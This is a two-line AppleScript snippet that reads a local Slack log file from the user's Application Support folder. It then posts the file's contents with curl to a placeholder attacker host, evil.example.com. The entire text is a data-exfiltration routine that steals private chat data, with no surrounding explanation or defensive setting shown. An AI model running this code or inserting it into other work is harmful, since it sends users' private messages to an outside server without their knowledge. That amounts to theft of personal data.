set fileData to read POSIX file "/Users/you/Library/Application Support/Slack/slack-log.txt"
do shell script "curl -X POST -d " & quoted form of ("data=" & fileData) & " http://evil.example.com/upload"
